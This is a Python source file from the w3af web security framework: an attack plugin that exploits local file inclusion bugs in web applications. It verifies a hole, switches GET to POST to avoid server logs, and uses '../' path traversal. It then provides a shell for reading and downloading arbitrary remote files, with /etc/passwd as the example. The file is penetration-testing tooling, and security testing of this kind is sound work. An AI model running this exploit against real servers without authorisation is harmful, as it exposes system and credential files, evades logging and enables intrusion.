'''
localFileReader.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


import core.controllers.outputManager as om
# options
from core.data.options.option import option
from core.data.options.optionList import optionList
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
from core.controllers.misc.levenshtein import relative_distance_ge

import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln
from core.data.kb.read_shell import read_shell as read_shell

from core.controllers.w3afException import w3afException
import core.data.parsers.urlParser as urlParser


from plugins.attack.payloads.decorators.read_decorator import read_debug


class localFileReader(baseAttackPlugin):
    '''
    Exploit local file inclusion bugs.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # Internal variables
        self._already_tested = []
        
        # User configured variables
        self._changeToPost = True
        self._url = ''
        self._method = 'GET'
        self._data = ''
        self._file_pattern = ''
        self._generateOnlyOne = True
        
    def fastExploit( self ):
        '''
        Exploits a web app with local file include vuln.
        '''
        if self._url == ''or self._file_pattern == '' or self._data == '':
            om.out.error('You have to configure the "url" parameter.')
        else:
            v = vuln.vuln()
            v.setPluginName(self.getName())
            v.setURL( self._url )
            v.setMethod( self._method )
            v.setDc( self._data )
            v['file_pattern'] = self._file_pattern
            kb.kb.append( 'localFileInclude', 'localFileInclude', v )
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''
        return 'shell'
    
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
        
        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
        return 'osCommanding' in this method.
        '''        
        return 'localFileInclude'
        
    def _generateShell( self, vuln_obj ):
        '''
        @parameter vuln_obj: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as a parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln_obj ):
            
            if vuln_obj.getMethod() != 'POST' and self._changeToPost and \
            self._verifyVuln( self.GET2POST( vuln_obj ) ):
                msg = 'The vulnerability was found using method GET, but POST is being used during'
                msg += ' this exploit.'
                om.out.console( msg )
                vuln_obj = self.GET2POST( vuln_obj )
            else:
                msg = 'The vulnerability was found using method GET, tried to change the method to'
                msg += ' POST for exploiting but failed.'
                om.out.console( msg )
            
            # Create the shell object
            shell_obj = fileReaderShell( vuln_obj )
            shell_obj.setUrlOpener( self._urlOpener )
            shell_obj.set_cut( self._header_length, self._footer_length )
            
            return shell_obj
            
        else:
            return None

    def _verifyVuln( self, vuln_obj ):
        '''
        This command verifies a vuln.

        @return : True if vuln can be exploited.
        '''
        function_reference = getattr( self._urlOpener , vuln_obj.getMethod() )
        
        #    Prepare the first request, with the original data
        data_a = str(vuln_obj.getDc())
        
        #    Prepare the second request, with a non existent file
        vulnerable_parameter = vuln_obj.getVar()
        vulnerable_dc = vuln_obj.getDc()
        vulnerable_dc_copy = vulnerable_dc.copy()
        vulnerable_dc_copy[ vulnerable_parameter ] = '/do/not/exist'
        data_b = str(vulnerable_dc_copy) 
        
        try:
            response_a = function_reference( vuln_obj.getURL(), data_a )
            response_b = function_reference( vuln_obj.getURL(), data_b )
        except w3afException, e:
            om.out.error( str(e) )
            return False
        else:
            if self._guess_cut( response_a.getBody(), response_b.getBody(), vuln_obj['file_pattern'] ):
                return True
            else:
                return False

    def getOptions( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        d0 += ' during exploitation.'
        h0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        h0 += ' during exploitation; this is usefull for not being logged in the webserver logs.'
        o0 = option('changeToPost', self._changeToPost, d0, 'boolean', help=h0)
        
        d1 = 'URL to exploit with fastExploit()'
        o1 = option('url', self._url, d1, 'string')
        
        d2 = 'Method to use with fastExploit()'
        o2 = option('method', self._method, d2, 'string')

        d3 = 'Data to send with fastExploit()'
        o3 = option('data', self._data, d3, 'string')

        d4 = 'The file pattern to search for while verifiyng the vulnerability.'
        d4 += ' Only used in fastExploit()'
        o4 = option('file_pattern', self._file_pattern, d4, 'string')

        d5 = 'Exploit only one vulnerability.'
        o5 = option('generateOnlyOne', self._generateOnlyOne, d5, 'boolean')
        
        ol = optionList()
        ol.add(o0)
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        return ol
        
    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter optionsMap: A dict with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._changeToPost = optionsMap['changeToPost'].getValue()
        self._url = optionsMap['url'].getValue()
        self._method = optionsMap['method'].getValue()
        self._data = urlParser.getQueryString( optionsMap['data'].getValue() )
        self._file_pattern = optionsMap['file_pattern'].getValue()
        self._generateOnlyOne = optionsMap['generateOnlyOne'].getValue()
        
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack
        plugin. This is used by the "exploit *" function to order the plugins and first try to
         exploit the more critical ones. This method should return 0 for an exploit that will 
        never return a root shell, and 1 for an exploit that WILL ALWAYS return a root shell.
        '''
        return 0.0
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits local file inclusion and let's you "cat" every file you want. 
        Remember, if the file in being read with an "include()" statement, you wont be able 
        to read the source code of the script file, you will end up reading the result of the
        script interpretation. You can also use the "list" command to list all files inside 
        the known paths.
        
        Six configurable parameters exist:
            - changeToPost
            - url
            - method
            - data
            - generateOnlyOne
        '''

PERMISSION_DENIED = 'Permission denied.'
NO_SUCH_FILE =  'No such file or directory.'
READ_DIRECTORY = 'Cannot cat a directory.'
FAILED_STREAM = 'Failed to open stream.'

class fileReaderShell(read_shell):
    '''
    A shell object to exploit local file include and local file read vulns.

    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''
    _detected_file_not_found = False
    _application_file_not_found_error = None

    def help( self, command ):
        '''
        Handle the help command.
        '''
        if command == 'help':
            om.out.console('')
            om.out.console('Available commands:')
            om.out.console('    help                            Display this information')
            om.out.console('    read                            Echoes the contents of a file.')
            om.out.console('    download                        Downloads a file to the local filesystem.')
            om.out.console('    list                            List files that may be interesting.')
            om.out.console('                                    Type "help list" for detailed information.')
            om.out.console('    exit                            Exit the shell session')
            om.out.console('')
        elif command == 'read':
            om.out.console('read help:')
            om.out.console('    The read command echoes the content of a file to the console. The')
            om.out.console('    command takes only one parameter: the full path of the file to ')
            om.out.console('    read.')
            om.out.console('')
            om.out.console('Examples:')
            om.out.console('    read /etc/passwd')
        elif command == 'download':
            om.out.console('download help:')
            om.out.console('    The download command reads a file in the remote system and saves')
            om.out.console('    it to the local filesystem.')
            om.out.console('')
            om.out.console('Examples:')
            om.out.console('    download /etc/passwd /tmp/passwd')
        return True
        
    def _init_read(self):
        '''
        This method requires a non existing file, in order to save the error message and prevent it
        to leak as the content of a file to the uper layers.
        
        Example:
            - Application behaviour:
                1- (request) http://host.tld/read.php?file=/etc/passwd
                1- (response) "root:x:0:0:root:/root:/bin/bash..."
                
                2- (request) http://host.tld/read.php?file=/tmp/do_not_exist
                2- (response) "...The file doesn't exist, please try again...'"
                
            - Before implementing this check, the read method returned "The file doesn't exist, please try again"
            as if it was the content of the "/tmp/do_not_exist" file.
            
            - Now, we handle that case and return an empty string.
        '''
        self._application_file_not_found_error = self.read('not_exist0.txt')
    
    @read_debug
    def read( self, filename ):
        '''
        Read a file and echo it's content.

        @return: The file content.
        '''
        if not self._detected_file_not_found:
            self._detected_file_not_found = True
            self._init_read()
            
        # TODO: Review this hack
        filename = '../' * 15 + filename

        # Lets send the command.
        function_reference = getattr( self._urlOpener , self.getMethod() )
        data_container = self.getDc()
        data_container[ self.getVar() ] = filename
        try:
            response = function_reference( self.getURL() ,  str(data_container) )
        except w3afException, e:
            return 'Error "' + str(e) + '" while sending command to remote host. Try again.'
        else:
            #print '=' * 40 + ' Sb ' + '=' * 40
            #print response.getBody()
            #print '=' * 40 + ' Eb ' + '=' * 40

            cutted_response = self._cut( response.getBody() )
            filtered_response = self._filter_errors( cutted_response, filename )
            
            #print '=' * 40 + ' Sc ' + '=' * 40
            #print filtered_response
            #print '=' * 40 + ' Ec ' + '=' * 40
            
            return filtered_response
                
    def _filter_errors( self, result,  filename ):
        '''
        Filter out ugly php errors and print a simple "Permission denied" or "File not found"
        '''
        filtered = ''
        
        if result.count('<b>Warning</b>'):
            if result.count( 'Permission denied' ):
                filtered = PERMISSION_DENIED
            elif result.count( 'No such file or directory in' ):
                filtered = NO_SUCH_FILE
            elif result.count( 'Not a directory in' ):
                filtered = READ_DIRECTORY
            elif result.count('</a>]: failed to open stream:'):
                filtered = FAILED_STREAM
                
        elif self._application_file_not_found_error is not None:
            #   The application file not found error string that I have has the "not_exist0.txt"
            #   string in it, so I'm going to remove that string from it.
            app_error = self._application_file_not_found_error.replace("not_exist0.txt",  '')
            
            #   The result string has the file I requested inside, so I'm going to remove it.
            trimmed_result = result.replace( filename,  '')
            
            #   Now I compare both strings, if they are VERY similar, then filename is a non 
            #   existing file.
            if relative_distance_ge(app_error, trimmed_result, 0.9):
                filtered = NO_SUCH_FILE

        #
        #   I want this function to return an empty string on errors. Not the error itself.
        #
        if filtered != '':
            return ''
        
        return result
    
    def getName( self ):
        '''
        @return: The name of this shell.
        '''
        return 'localFileReader'
        
